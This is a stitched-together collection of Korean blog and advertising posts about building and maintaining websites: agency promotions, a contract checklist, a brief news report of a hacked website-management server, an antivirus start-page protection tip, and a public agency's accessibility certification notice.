4회이상 실시하고 매년 1회 우수관리홈페이지를 선정하여 관리자에서 소정의 상품을 시상했다. 부산 홈페이지 관리에 대해서좋은 정보하나 알려드릴까 합니다. 부산 홈페이지 관리 베스트업체 글로브임펙트  우리회사에 대해서 알리고싶을때온라인 고객을 대상으로 하신다면꼭 필요한것이 있는데요바로 홈페이지입니다 ​​ 부산 홈페이지 관리 베스트업체 글로브임펙트 ​홈페이지란 웹사이트와 같은 뜻으로 HTTP프로토콜을 사용하여특정 URL로부터 받아오는 HTML로 쓰여진 문서를 이야기합니다.​이렇게 들으시면 정말 헷갈리실텐데요현제 보고있는 페이지가 홈페이지라고 생각하면단순하게 이해가 되실거예요 ​  우리가 사용하는 블로그또한 웹사이트를 기반으로만들어져서 작동하게된답니다최근에는 홈페이지가 없는 특정브랜드나 업체가 거의 없을정도로대중화되어 있습니다 ​ 부산 홈페이지 관리 베스트업체 글로브임펙트 ​이러한 홈페이지는 직접 제작할 수도있으나전문업체에 제작을 의뢰하는것이 일반적입니다. ​  ​회사에서 홈페이지 제작을 해볼까 생각했었는데그냥 부산 홈페이지 관리대행 업체에 맡기는게 어떨까라고말씀하시더라고요결국 알아보는것은 제 몫이여서 제가 차차 알아보게되었어요홈페이지 관련 후기들을 살펴보는데좋은 업체들도 물론 많지만이상한 업체들도 상당히 많더라고요​ 부산 홈페이지 관리 베스트업체 글로브임펙트 ​국내에는 정말 다양한 홈페이지 제작업체가 존재하는것 같았어요오히려 그 수가 너무많으니까 어떤업체를 골라야할지 정말 머리가 핑 도는 느낌이라해야할까요 홈페이지 제작을 앞두고서 업체를 선정할때 가장먼저 생각해야할것은 바로믿을수있는 업체인지를 고려해봐야한다는것입니다 ​​  ​ 믿을수있는 기업!글로브임펙트​물론 일을 맡겨보지않고서 어떻게 믿을만한 업체인지 모르겠다는 분들도 많습니다이런 경우 무엇보다도 업체와의 소통이 가장 필요합니다업체와의 상담을 통해 이 업체가 정말로 진실성있는 상담을 하는지너무 이루지도 못할 허황된 목표만 이야기하는것이 아닌지 살펴보시는것이 가장 좋습니다. ​​ 부산 홈페이지 관리 베스트업체 글로브임펙트 ​​​​글로브임펙트는 다른곳과 달리빠른 1:1 소통이 가능하고 언제나 빠른 피드백으로 대응하기때문에정말 이런부분에는 만족감을 많이 느끼신다고 하시더라고요 ​​ 부산 홈페이지 관리 베스트업체 글로브임펙트 ​​​​견적이나 보수에 관한 문의같은건 글로브임펙트에 한번 문의해보세요글로브임펙트는 또한 사회적기업으로 부산이 인정한 믿을만한 기업이고또한 전문디자인팀이 상주하고 있어서 빠른 피드백이 가능한것같아요 :)​​​ 글로브임펙트부산광역시 남구 유엔평화로 136-1 4층  부산 홈페이지 제작 / 보수 상담 T. 051-710-4008​​​​ ​​​​​​안녕하세요~~!​​서초구 방배동에 위치한18년 경력의 맞춤형 홈페이지 제작업체 ​​ ​(주)지앤글로벌(감각디자인) 입니다.​​​​홈페이지는 특성상, 한 번 제작하고 나면 오랫동안 사용하시는 분들이​​ ​거의 대부분이기 때문에 초기에 제대로된 홈페이지를 제작하시는 것이 좋은데요,​​​​저희 감각디자인은 맞춤형 홈페이지 제작 전문업체로 필요하신 기능들과 ​​원하시는 디자인에 맞춰 제작을 해드리고 있습니다.​​ ​​​홈페이지 제작 목적에 따라 다르겠지만 설명문구나 이미지, 프로그램 리스트, 게시판 등을​​직접 관리하실 수 있도록 별도의 관리자 모드를 세팅해드리고 있는데요,​​저희 감각디자인이 자체 제작한 보드를 사용하기 때문에 ​​​비전문가분들도 쉽게 홈페이지를 관리하실 수 있도록 세팅해드리고 있습니다.​​​​사실 홈페이지는 제작하고 끝이 아닌 지속적인 관리가 필요하다고 할 수 있는데요,​​작은 부분을 변경하기 위해 제작 업체에게 일정 금액을 지불하고 수정해야하는 ​​​업체들도 굉장히 많은데요, 이는 관리자모드를 제공해주지 않는 제작 업체를​​선정했기 때문입니다. ​​ ​​​하지만 저희 감각디자인은 직접 관리하셔야하는 부분은 관리자 모드에서 처리가 ​​가능하도록 제작해드리기 때문에 오랫동안 효율적으로 홈페이지를 관리하며 ​​ ​사용하실 수 있겠죠?​​​​저희 감각디자인으로 문의주시면 18년 동안의 제작 경험을 바탕으로 ​​최신 트랜드는 물론이고 전반적인 구성이나 기능 구현 그리고 제작 이후의 관리적인 부분 등 ​​​홈페이지를 제작하고 관리하시는데 필요한 내용들에 대한 자세한 상담을 도와드립니다.​​​​보다 더 자세한 설명과 내용정리를 위해 서울 & 경기 & 인천 등의 수도권 지역에 계시는 경우 ​​방문 상담도 도와드리고 있으니 언제든지 편하게 문의주시기 바랍니다. ​​​​​​​​​ ​ ​ ​ ​​ 380여 단체의 홈페이지를 관리하고 있는 업체의 서버가 해킹되어 경찰이 수사에 나섰습니다. 28일 서울 성동경찰서에 따르면 해당 업체는 고등학교와 대학 동창회, 대한민국육군협회 등 387곳의 홈페이지를 관리하고 있으며 피해 단체는 서울 경기여고, 경복고, 서울고, 세종고, 숙명 여자중.고, 서울대의대, 부산대 등 동창회와 서울시의사회, 대한민국육군협회, 한국산업단지경영자연합회 등으로, 주로 회원 아이디, 비밀번호, 연락처, 주소 등이 유출된 것으로 파악 되었습니다. 업체 측은 이 같은 정보가 해킹된 사실을 파악한 뒤 지난 20일 경찰에 수사를 의뢰하였습니다.앞서 해당 업체는 2014년 7월에도 중국 IP를 통해 접속한 해커의 공격으로 약 12만 건의 개인정보가 유출되는 피해를 본 것으로 알려졌습니다.​ ​이번 해킹은 지난달 24일 오전 0시10분에 이뤄졌으며 해커들은 가상사설망(VPN)을 이용해 우회적으로 홈페이지에 접속하고서 회원들 개인 정보를 빼낸 것으로 알려졌습니다.해커들은 "암호화폐 계좌에 입금하지 않으면 개인 정보를 유출하겠다"고 업체를 협박하였다고 합니다.한편 업체 측은 유출 사실을 인지한 후 해당 서버를 폐쇄하고 홈페이지 이전을 완료했다며 필요한 조사를 거쳐 손해배상 등의 구제 절차를 진행하겠다고 회원들에게 공지했습니다.경찰은 업체 서버에 접속한 기록을 남긴 인터넷 주소(IP) 11곳을 확인하고 해커 소재를 추적하고 있습니다.​​​법률,행정 분야의 전문가를 기다립니다. (주)법률쇼핑 입점신청T.1670-6731/1670-6732F.070-4774-6400​ ​ 안녕하세요. 다산 커뮤니케이션입니다.​보통 홈페이지는 다양한 부분을 꼼꼼하게 따져보고 제작을 진행하게 됩니다. 아무래도 제작 비용이 SNS 계정 개설등에 비하면 상당히 비싼 축에 속하기도 하고 홈페이지가 추후 온라인 상에서 업체의 얼굴이 되다 보니 신경써서 제작에 임하게 되는데요. 그러나 이렇게 비싼 돈을 들여 제작한 홈페이지도 제대로 활용을 하지 못한다면 무용지물이 될 수밖에 없죠. 특히 아예 홈페이지를 이용하지 않거나 관리에 소홀하여 방치된 홈페이지가 정말 많은데요. 관리를 해 보려고 결심해봐도 기존 업체가 연락이 잘 되지 않거나 지나친 관리 비용을 요구하여 낭패를 보는 분들도 많습니다. 또 홈페이지는 잘 이용하고 있지만 기존 업체와 맞지 않아 새로운 업체에 관리를 맡기고 싶어하는 분들도 더러 계시구요.​저희 다산 커뮤니케이션은 이러한 분들을 위해 확실한 관리 서비스를 제공하고 있는데요. 많이들 걱정하시는 비용 문제에서도 부담없이 이용하실 수 있도록 최선을 다 하고 있어 믿고 관리를 맡기실 수 있습니다. 홈페이지 관리 비용은 얼마일까?다산 커뮤니케이션사실 홈페이지 관리 비용은 확실하게 말씀 드리기가 어렵습니다. 관리 중 어떤 서비스를 이용하시느냐에 따라 비용에 차이가 발생하기 때문인데요. 확실히 말씀 드릴 수 있는 것은, 저희 다산 커뮤니케이션은 단순한 수정에서부터 전문성이 필요한 디테일한 관리 등 모든 서비스를 제공하고 있으며 항상 합리적인 가격에 모든 것을 이용하실 수 있다는 것입니다. 따라서 비용에 대한 부담을 덜고 확실하고도 센스있게 홈페이지를 관리하실 수 있습니다.​또 홈페이지를 이용하다보면 갑작스레 문제가 발생하기도 하고 빠른 시간 내에 수정해야 할 부분들이 생기기도 하는데요. 저희 다산 커뮤니케이션은 항시 빠른 시간 내에 고객님께 대응할 수 있도록 대기 중이므로 어떤 문제든지 빠른 해결이 가능합니다. 실제로 기존 업체의 대응이 너무 느려 새로운 업체에 관리만을 맡기는 분들도 참 많으신데요. 저희 다산 커뮤니케이션을 이용하실 때에는 이러한 불만을 느끼지 않으시도록 최선을 다해 노력하고 있습니다.​홈페이지 관리, 어쩌면 제작보다도 중요한 부분이라 말할 수 있는데요. 관리가 잘 되지 않는 홈페이지는 신뢰도를 하락시켜 오히려 악영향을 미치게 되는 경우가 많습니다. 공들여 제작한 홈페이지 역효과를 내게 하지 않기 위해서는 좋은 업체를 찾아 홈페이지를 잘 관리하시는 것이 좋은데요. 현재 홈페이지 관리 문제로 고민 중이시라면 저희 다산 커뮤니케이션에 연락 주셔서 정확한 견적을 받아 보시길 바랍니다. 언제든지 문의 주세요. 감사합니다.​ 우건빌딩서울특별시 강북구 덕릉로 114  홈페이지 관리비용 문의- 전화 : 1899-8109- 카톡 : https://open.kakao.com/o/sk8pAkVb 광고문의 주세요.#네이버파워링크 #키워드광고 #다산컴즈 #다산커뮤니케이션 #파워링크광고 #뉴웹커뮤니케이션open.kakao.com ​ 홈페이지제작비용 알아보고 계십니까?​하지만 홈페이지 제작에는 비용보다 더 중요한것들이 있습니다.​직접 부딪치고, 부딪히고 나서야 알게 되는 것들인데요, 저도 홈페이지 만드는 일몇개를 발주해 보고 나서야 알게 된 것들입니다.​꼭 꼭 꼭!! 반드시!!​ 홈페이지 제작 전에 확인하십시오.​  © wocintechchat, 출처 Unsplash​  홈페이지가 임대형은 아닌지? ​이 무슨 해괴망측한 소리인가 싶으십니까?​임대형 홈페이지일 리가 없지 않습니까?​우리 회사 홈페이지를 발주했고, 우리가 비용을 지불했고,결과물이 나왔으면 당연히 그 홈페이지는내 소유인 것 아닙니까?​아니더라고요.  ​​우리가 계약서에 서명할 때에는 앞단이랑굵게 되어 있는 부분만 꼼꼼히 읽지 않습니까?​하지만 작게 명시가 되어 있었습니다.​'계약 기간이 지나면 홈페이지의 소유는 을이 갖는 것으로 한다'​이게 무슨 말인지 몰랐는데요,이런 것이 바로 임대형 홈페이지라고 합니다.​계약 전에 반드시 확인해야 합니다.​"임대형 홈페이지 아니죠? 소유형 맞죠?"​홈페이지제작비용보다 더 중요한 체크사항입니다.​​  © wocintechchat, 출처 Unsplash​  수정과 업데이트는 가능한지? ​홈페이지를 운여아다보면,당연히 수정할 것도 많이 생기고 업데이트도해야하죠.너무다 당연한 상식 아니겠습니까?​내가 컴공과를 나왔다거나,웹디자이너거나,컴퓨터 프로그래밍 실력자라면뭐 이런것 확인 안하셔도 됩니다.​하지만!​애초에 그랬으면 홈페이지 제작을 외주 주지 않았을 겁니다. ㅜㅜ​계약서에 수정과 업데이트에 관한 것이 어떻게 명시되어 있는지 보십시오.​1. 수정과 업데이트가 가능한지?2. 몇번까지 가능한지?3. 비용은 추가로 있는지?​꼬옥 꼬옥 확인하십시오.계약 조건에 따라서 너무도 천차만별입니다.​홈페이지제작비용을 책정할 때에는 수정과 업데이트 비용까지 고려해서 해야 합니다!!​​  © wocintechchat, 출처 Unsplash​  긴급상황에 대한 도움을 주는지? ​홈페이지를 운영하다 보면 예기지 못한사건 사고들이 발생합니다.​서버가 다운되기도 하고요,알수 없는 오류가 생기기도 하고요해킹 시도가 계속 있을 수도 있고요무시무시한 바이러스 감염도 있습니다.​이때 제대로 방화벽 세팅, 백업 등이 되어있지않다면?복구가 바로 되지 않는다면?​치명적일 수 있습니다.​이것 역시 내가 전문가다!​한다면 괜찮습니다만,그렇지 않다면 제작업체에서 도와줄 수 있는지?아니면 제작 할 때 이에 대한 대비책을 마련해주는지?아니면 홈페이지 관리 역시 외주를 주어야 하는지?​미리 계획을 세우십시오.​홈페이지제작비용 책정시에는 운영과 관리 비용도 같이 생각해야 합니다.​  © wocintechchat, 출처 Unsplash​  모바일용은 별도로 제작해야 하는지? ​많은 분들이 알지 못하는 것인데요,정말 단순한 것입니다.​홈페이지를 만들면 PC에서 볼 때랑스마트폰이나 탭에서 볼 때랑 다른 화면이보입니다.​스마트 폰으로 보다가,아래쪽에 PC버전으로 보기  이런 것 본 적 있으시죠?​맞습니다.​같은 웹페이지가 PC와 모바일에서 다르게보이는 것이 아니라,각각 다른 버전으로 따로 제작하는 것입니다.​PC용탭용스마트폰용​이 사실을 모르고 계약한다면?​홈페이지제작비용에는 모바일 버전용 홈페이지 제작도 포함 되어 있는지 확인해야 합니다.​  © wocintechchat, 출처 Unsplash​홈페이지 제작 의뢰를 하기 전에 확인할 것들을정리해 보면​결과물의 품질이 좋은 것은 기본이고,소유형이고수정/업데이트가 가능하고비상시 대비와 관리가 가능하고모바일용 제작도 가능한그리고 적당한 가격의​홈페이지 제작 대행사를 찾아야 겠네요?​​그런 곳을 알고 있느냐고요?하하하 그렇습니다!​  ​​  © wocintechchat, 출처 Unsplash​말씀드린 조건에 한치의 어긋남도 없는!딱 드러맞는 곳입니다.​몇군데 찾았지만,가장 만족한 곳은 바로바로 이곳!​ ​기존에 있는 폼에다가 내용만 덮어 씌우는 것이아니라, 고객의 니즈에 맞게 처음부터 새로제작해 줍니다.​100% 고객 니즈 반영!​ ​당연히 소유형이고요!​ ​모바일용, 반응형, 도메인 등록, 백업, 백신,방화벽 완벽제공!​ ​신생업체가 아니라서레퍼런스도 풍부합니다. ​홈페이지 품질도 뿜뿜!! ​​어떻습니까?상담한다고 해서 꼭 계약해야 하는 것도 아니고비용이 따로 들어가는 것도 아니니한번 알아보십시오.​홈페이지만 방문해서 둘러보셔도 좋겠네요.​저는 일단 홈페이지 제작사는본인들 회사 홈페이지가 매력적이어야한다고 생각합니다.​알아보러 홈페이지에 들어갔는데에게~~ 하게 되면 안끌립니다.​그럼 잘 알아보시고,멋드러진 홈페이지 만드시기 빕니다.​모두 사업 번창하십시오.응원하겠습니다.​​  ​ ​  인터넷 시작 페이지, 알약 '홈페이지 관리 기능'으로 지킬 수 있어요! :) 서울시 서초구에 사는 김 모씨는 여느때처럼 인터넷을 실행했다가 깜짝 놀랐어요! 인터넷 시작페이지가 설정해 둔 페이지가 아닌 엉뚱한 홈페이지로 바뀌어있지 뭐예요~ 익스플로러의 [도구]-[인터넷옵션]에서 시작 페이지를 다시 원래대로 바꾸려고 해도 악성코드에 감염된건지 도무지 바뀌질 않고... 에휴~ 김모씨는 알약 '홈페이지 관리' 기능을 몰랐나봐요~ㅠ_ㅠ 알약 '홈페이지 관리' 기능을 이용해 홈페이지 URL을 등록해 두면, 다른 프로그램 등을 통해 시작 페이지가 변경되는 것을 막을 수 있어요! :)  알약 '홈페이지 관리' 기능 초간단 사용법!  먼저, 알약을 실행하고 [환경설정]을 클릭해 주세요. <알약 실행 - 환경설정>   환경설정에서 [기타설정]-[기타]를 클릭하면 '홈페이지 관리'메뉴가 있어요~ '홈페이지 URL'을 입력하는 곳에 원하는 시작 페이지 주소를 입력한 후 아래 [확인]을 눌러 주세요!  <알약 환경설정 - 홈페이지 관리>  이렇게 하면 '홈페이지 URL'에서 설정한 홈페이지가 변경되지 않도록 알약이 보호해주고, '홈페이지 자동 보호 알림'을 사용하면 시작 페이지를 변경하려고 하는 프로세스 정보를 알려줍니다. '홈페이지 변경 알림'은 자동 보호 기능을 사용하지 않을 때, 외부의 홈페이지 변경 시도가 있을 때 마다 안내창을 띄워 알려줘요~! TIP. 홈페이지 관리 기능은 '홈페이지 URL'에 입력한 주소와 실제 [도구]-[인터넷 옵션]에서 설정한 홈페이지가 일치할 때 정상적으로 작동한다는 것도 꼭 기억해 주세요~! :)   시작 페이지도 든든하게 지켜주는 똑똑한 알약~! 앞으로도 많이 사랑해 주세요! :)    ▶알약 최신 버전 다운로드! (클릭)   * 홈페이지 관리비용(10% 부가세 별도)1. 서버관리비 : 2만원2. 서버구입비(서버회사에 따름)3. 도메인 등록비(co.kr/com, 도메인 등록회사에 따름)4. 호스팅 유지비(서버회사에 따름)5. 유지보수비(기본) : 10만원 (이미지와 텍스트 그리고 링크 수정 각각 5건에 한해, 유지보수 추가비용은 건별로 별도의 견적이 제안됩니다.)​​[필독] * 서버와 호스팅은 당사 web_LAB MIGRIDA 에서 관리하는 것을 기본으로 합니다.* 도메인은 개인이 직접 구매하도록 합니다. 구매방법은 당사에서 알려드리는 것을 기본으로 합니다.* 호스팅 유지비는 호스팅 비용이 만료되었을 때 개인에게 청구드립니다.* 홈페이지 관리비용을 지불하지 않을시에는 최종 통보 후 1주일 내에 서버호스팅이 만료됩니다.​* 서버를 이전하고 싶다면, 호스팅 되는 홈페이지 제작 데이타를 메일로 발송해 드립니다.(제작데이터는 디자인 psd파일과 서버에 업로드된 파일을 드립니다.) 대전시설관리공단 홈페이지, '웹 접근성 품질인증' 9년 연속 획득- 장애인, 고령자 등 웹사이트 이용에 불편 없도록 표준지침 준수 -​ ​대전광역시시설관리공단은 대표 홈페이지(www.djsiseol.or.kr)가 과학기술정보통신부가 부여하는‘웹 접근성 품질인증’을 9년 연속으로 획득했다고 밝혔습니다.‘웹 접근성 품질인증’은 장애인 및 고령자가 웹사이트 이용 시 불편을 느끼지 않도록 웹 접근성 표준지침을 준수하는 우수 홈페이지에 이를 상징하는 품질마크를 부여하는 인증제도입니다.​공단은 2012년 웹 접근성 품질인증을 획득한 이래 올해까지 9년 연속으로 인증마크 심사를 통과해 웹 접근성 품질을 유지하고 있습니다.​공단 관계자는 “앞으로도 인터넷서비스 이용이 어려운 장애인, 고령자와 같은 정보소외계층을 포함한 모든 사용자가 편리하게 홈페이지를 이용 할 수 있도록 최적화된 환경을 조성해나가겠다.”고 전했습니다. 네이버 블로그는 맞지만, 확인불가​ ​​ 병원홈페이지 필요한가요?​환자들이 모이는 플랫폼블로그인가요? 병원홈페이지 인가요?이것부터 결정하시고 고민하는게 맞는데요​​저는 홈페이지가 좋은 홍보도구 라고 생각을 합니다.  그 이유는 자체 프로그램을 넣어 유입하는 진성고객등을 파악하고 예상해서 추후 마케팅등에 활용할수 있어서 인데요​​아무래도 고객유입은 자사에 대한 브랜드키워드 ( 00치과 ) 가 높아졌다고도 이야기 할 수 있습니다. ​​기획이 중요합니다. ​​그래서 우리에 대해 궁금해 하시는 분들을 위한 첫 인트로 카피라이팅에 대한 기획이 중요한데요. ​​블로그는 제목등을 확인하고 궁금증이 생겨 들어오지만 홈페이지는 인터넷에서 키워드 최적화를 시켜 00치과를 치면 나오게 하는 것이 중요합니다. ​ 위의 경우를 보시면 플란트라는 단어를 많이 쓰시기 때문에 실제로는 플란트인을 검색했지만 다른곳이 상단에 뜨게되어 고민이 많으셨는데요​​이런경우는 트래픽등을 증가시켜 해결하시면 됩니다. ​​이렇게 검색되어 들어오게 되면 가급적 회원가입을 시켜 우리의 가망고객으로 생각을 하게 하면 되는데요. 그렇게 하기위해 회원가입후 볼수 있는 환자의 후기나 치료사례에 대해 궁금증을 유발시키며​​계속 머물르게 하는 색다른 카피라이팅을 기획해서 인트로에 힘을주고 있습니다. ​​병원홈페이지는 무조건 필요하다고 생각하진 않지만 규모가 있다면 제작하는것이 맞다고 생각합니다​ 홈페이지 금액이 천차만별 이예요 어떻게 금액이 나오나요?퍼블리싱을 하여 자체 개발을 하는지아니면 플랫폼에서 구입해서 이미지만 제작을 하는지에 따라 금액이 달라집니다. ​​가장 간단한것은 랜딩페이지 입니다. 랜딩페이지부터 많게는  40.50페이지가 되는것도 있고요이런것에 따라 금액 차이가 나겠죠​​아 그리고 이미지등을 아예 원페이지로 하느냐.. 아니면 각각 제작을 하는것에 따라서도 금액이 달라집니다. ​​사실 병원측에서는 이러한것을 잘 구분할수 없는데각각 디자인을 하면 추후 관리를 하면서 의사등이 바뀌거나 시설환경이 바뀔때 유용한점이 있습니다. ​​또한 요새는 영상등도 넣어서 점점 시각화에서 영상화로 만들고 있는데요이런 기능등을 추가하면 비용이 아무래도 더 나오겠죠?​​ 더 중요한것은 홈페이지 관리입니다. ​사실 플랫폼으로 하는게 비용이 저렴하지만꼭 아실점은 관리입니다​​지속적인 고객과의 소통과 배너등을 올리고방문자들에 대한 분석과 관리가 되어야마케팅의 수단이 될수 있는것 입니다​​병원홈페이지 안에 자체 방문 통계등을 넣고검색 키워드등을 파악해서 다른 마케팅에도이용 하시미 좋을듯 합니다​ 물론 블로그를 꾸며 소통과 홍보를 동시에 하시기도 하는데초창기에는 보통 한 가지를 정하는게 맞다고 말씀드리고 있습니다. ​​ ​​​​마케팅의 도구로서 블로그도 좋지만 진성으로 자사의 키워드로 검색하여 들어오는 도구는 홈페이지이기 때문에 고민을 해보시고 결정을 하시면 좋겠습니다. ​​결국 자사의 키워드가 핵심입니다. ​​ 여러 정보들을 써치한다. 어 ? 여기치과 괜찮네?그 치과이름을 친다. 가치를 입증시키고신뢰를 준다. ​​​​병원홈페이지를 제작하기 앞서 궁금하셨던 것들이 해결되셨을까요?​​자사는 내부 프로그래머를 자체적으로 고용하여 환자들이 어떻게 검색을 하는지어떤 키워드로 온라인상 컨택이 되었는지를 확인이 쉬운 자체 프로그램을 넣어서 관리해드리고 있습니다. ​​페이지수가 적어도 아.. 여기는 활성화가 되고 있구나 라는 생각이 들 수 있게 꾸준히 유지 가능한 곳을 선택하는게 포인트입니다.​ ​ 실제 작업한 사례 ​​만들기전 뭐가 필요한지 플로우와 시간에 대해 설명을 드리면서 마치겠습니다. ​ 병원홈페이지 제작의 대략적인 플로우와 시간​우선 대략적으로 어떤 식으로 제작이 되고 기간이얼마나 걸리는 지 소개해드립니다.​ - 구체적인 방향 타겟팅 - 1차 기획안 컨셉 확정 및 상의- 사진 촬영, 약력 등 필요 자료 수집 - 강조하고 싶은 중요 포인트 광고주와 결정- 최종 방향 결정 및 2차 완성- 최종 완성​​보통 한달에서 세달정도 걸립니다. ​ 꽤 길고 복잡해 보일 수 있지만,저희는 오로지 의료마케팅만을 위해 실행하는 곳이기에 이렇게 단계를 세분화 함으로써 오히려 결과에 대한 완성도를 높이고 있습니다. ​​이미 수 많은 진행 경험을 바탕으로 얻어진 노하우를 집약시켜 클라이언트와의 대면 상담 전에 예시 및 시안들도 작성해서 가지고 가고 있어요.​​누군가를 브랜딩 시켰던 경험이 중요한 차이라고 생각합니다. ​​보통은 바로 미팅을 통해 1차 컨셉 회의를 하게 되는데 구체적인 예시나 시안 등을 가지고 만나게 되므로 시간 단축 및 원하시는 방향성을 끌어 내는데 효율이 높아진다는 평가를 받고 있습니다.    ​  사실 같은 치과라고 해도 어떤 점을 강조하고 싶으신지 그리고 궁극적으로 주력 타겟팅이나 방향은 어떻게 설정하실 지는 모두 다른데요.​​최대한 클라이언트가 원하시는대로 맞춰 드리고 싶지만 간혹 컨셉 자체와 너무 맞지 않는 경우에는 저희가 수정관리도 제시해 드리고 있어요. ​​짧게는 2~3개월 정도면 어느정도 기획이 끝나고 완성본까지 보실 수도 있지만 중간에 변경이나 수정 사항들이 많아진다면 수 개월이 더 추가되기도 합니다.호스팅 도메인구입도 하는거고요 ​사실 기간이 몇 개월 걸려요라는 정형화된 답변을 해 드릴 수 없는 이유를 모두 적어 두었는데 여유 있게 연락을 주시고 준비하실수록더 좋은 결과물이 나온다는 것도 염두에 두시면 좋을 것 같습니다. ​ 아무래도 여러 치과들의 기획부터 홍보까지 총괄 진행을 해 본 경험이 있다 보니 성과 위주로 의견 필력을 하기도 한다는 점​​그리고 단계는 세부적으로 나뉘고 기간은 그에 따라 달라질 수 있다! 라는점을 알아두시면 좋겠습니다 ​ ​ 병원홈페이지 마케팅 활용팁 ​사실 만드는 단계부터 이미 마케팅 기획은 시작이 되었다고 보시면 됩니다.대문을 만들었으니 이제 구체적인 홍보 전략을 세울 차례 입니다.그리고 어떻게 할지 목적을 분명히 만들어야겠죠. ​우선 가장 기본적인 역할이자 활용 단계 첫 번째는 유입된 잠재적인 고객들을 유입시키고 커뮤니케이션을 하는 것 입니다.​​이를 기반으로 어떤 채널이 효과적인지 그리고 주력 타깃 시술이나연령대 지역 등은 어디인지 등을 모두 분석 후 본격적으로 범위를 넓힙니다.​ 초기에는 분석할 데이터가 충분하지 않으므로, 적극적으로 브랜딩 이미지를 쌓아가면서 온라인 상에서 보일수 있도록 하는게 중요합니다​​병원홈페이지는 아무리 잘 만들어도 사용하지 않는다면 그 값을 하지 못하기에 관리인력이 있는 업체인지 확인하세요​ ​ ​ 방치는 NO! 관리까지 꼼꼼하게 초기 열심히 만든것이 수 개월이 지나면의외로 방치하는 경우가 적지 않습니다.전후 사진이라던가 말씀드린 컨텐츠 등이 더 이상 올라오지 않는 상태로 멈춰져 있다면 어떨까요?​​뭔가 질문들도 잘 올라오고 활성화 되야겠죠?​​매일 업로드를 할 수는 없더라도 주기적으로 확인을 한다는 ‘느낌’은 꼭 고객에게 주어야 됩니다.아무리 훌륭한 디자인과 초기 컨텐츠가 좋더라도 활성화가 되지 않는 곳은 딱 거기까지만 사용 가치가 있기 때문입니다.​ 조금 더 구체적으로 이유에 대해 설명해 드리면, 병원홈페이지는 소통의 창구이자 첫인상을 좌우하는 대문과 간판의 역할을 한다고 말씀드렸는데요. ​​잘 안되면 오히려 좋지 않은 영향을 미치게 됩니다. 운영이 잘 안되고 있다고 생각하거나 혹은 활성화가 잘 안된 곳이라는 이미지를 강하게 줄 수 있기 때문에 유지할 자신이 없다면 차라리 안만드는게 좋습니다. 너무 과격한 표현이지만 없는 것 보다 못한 애물단지가 될 수 있다는 것이죠.  ​ 실제 사례) 월에 한번씩 발행하고 있는 정기뉴스입니다. ​​매월 주기적인 관리와 정기 뉴스 발행 및 컨텐츠를꾸준히 올려 환자의 소통이 되는 창구로 만드는 것이 중요합니다. ​  브랜딩부터 마케팅 단계에서의 적극적인 활용 그리고 소통의 창구가 되도록 활성화 유지까지.제가 모두 원스톱으로 가능한 일이고 가장 자신 있는 일이기도 합니다. ​​개원을 준비하는 치과나 혹은 아직까지 없어서고객과 커뮤니케이션이 부족하다고 느끼셨다면 소통하였으면 좋겠습니다. ​​100만원부터 시작하는 관리되는 나만의것이 필요한 때입니다. 자사 프로그래머와 디자인팀 기획팀이 상주하는 곳과 함께하시는게 현명한 선택아닐까 생각합니다. ​​​  ​ 							대다수 업계 사장님들이 홈페이지 만드는데는 정말 신경을 많이 쓴다.경쟁사 홈페이지 보다 훨씬 뛰어난 디자인과 퀄리티를 보장해야 한다.배를 잘 만들어 놓으면 뭐하나  .... 배를 만들어서 어떤 목적에 쓰이게 할꺼고, 어떤 항로로 가야 하고, 어떤 엔진을 올려야 하고...어디로 가야 하는지에 대해 철두철미하게 계획하고 점검을 해도 사업이라는게 잘되니 안되느니 하는 판국인데...홈페이지제작업체가 알아서 다 해줄꺼라고 믿는가.. ??  천만에....어느 영업사원이 알아서 다 해주는 사람이 어디 있는가?? 그냥 한건의 수주,계약에 눈멀어 있는말 없는말 다 뱉는말에 현혹되어그냥 너네들이 알아서 다해라...는 식의 생각으로 수수방관하면서 계약금 날리고 잔금 날리고..정말 그런돈이면 와이프한테,, 애들한테 어디 외국여행이라도 한번 다녀오시지...홈페이지가 아니라 웹이라는 공간을 좀 이해를 했으면 한다. 이것을 이해하지 못하면 어느정도 학습을 통해서 좀 알아야 한다.일요일 ,토요일 조금만 짬내서 도서관에서, 아니면 거실에 한번정도 관심좀 가지면 생활이 편하다.대한민국이라는 공간에서 살아갈려면 최소한의 기본적인 법은 알고 있어야 하지 않는가??앞으로 세상은 웹을 떠나서는 살수도 없고 생각할수도 없다.이제 우리는 웹이라는 공간속에서 살아가고 있다. 이제 이러한 공간을 좀 이해해 나가야 한다.기성세대들도 웹이나 소셜에 대해 젊은사람이나 하는것이라고 치부하지 말고 적극적으로 배워야 한다...배워야 한다. 웹에서의 홍보방법을 배우고, 웹의 생태에 대해서 배워야 한다.그리고 나서 홈페이지를 만들든, 소셜을 만들든... 해야한다. 그래야 어느정도 포지셔닝 할수 있다고 생각한다.홈페이지 만들어만 놓으면 방문자가 저절로 늘어날것이라는 지극히 무사태평??? 만사형통?? 무식,순진???홈페이지관리에 앞서 먼저 홈페이지를 통해 메리트를 느껴야 홈페이지관리를 하고픈 맘이 생긴다. 그 메리트라는 것은 영업이나 수익 이런, 원하는 가치창출을 얘기하는 것이다.그것을 이루기 위해서 우리는 전문적인 지식보다는 어느정도 웹생태 그리고 웹공간의 홍보지식을 배울필요가 있다.이게 돈과 직결된다. 많이 알아야 돈을 절약할수 있고, 모르면 1위 자리 다툼하느라 돈만 다날린다.웹은 우리가 살아가는 또다른 공간인 만큼 누구나 관심을 갖고 조금씩 배워 나가면 정말 유익한 공간으로 보답할 것 같다.						 ​온라인 홍보를 하려면 이제 강제적으로 요구되는 것이 바로 홈페이지라고 할 수 있죠. 무엇보다 소비자들의 인터넷에 대한 의존도는 끝도 모르게 올라가고 있고 인터넷에서 검색되지 않는 정보들은 그게 어떤 분야이든지 관심 자체를 가지려 하지 않고 있습니다. 홈페이지는 여러 온라인 홍보 방식 중에서 스스로 마케팅 환경을 가지고 있고 더욱 안정적이면서 장기적으로 홍보와 동시에 브랜드에 대한 신뢰도를 함께 올려주는 등 다양한 장점들이 많습니다.​​​  ​그럼에도 불구하고 홈페이지를 막상 제작하는 게 고민되는 이유는 가격, 홈페이지 수정, 홈페이지 유지 보수, 홍보 등 제작만 하고 끝이 아니라 사후관리도 확실하게 해야 하고 해당 분야들은 대부분이 전문 기술을 요구하기 때문에 매우 까다롭죠. 에이치엘스토리는 클라이언트가 원하는 홈페이지를 디자인하여 제작해드리고 그 다음 웹사이트에 대한 전반적인 관리와 소비자들이 찾아올 수 있도록 대대적인 홍보도 함께 해드립니다.​​​​​  ​HL스토리는 모든 작업을 자체적으로 해결하고 있습니다.  홈페이지에 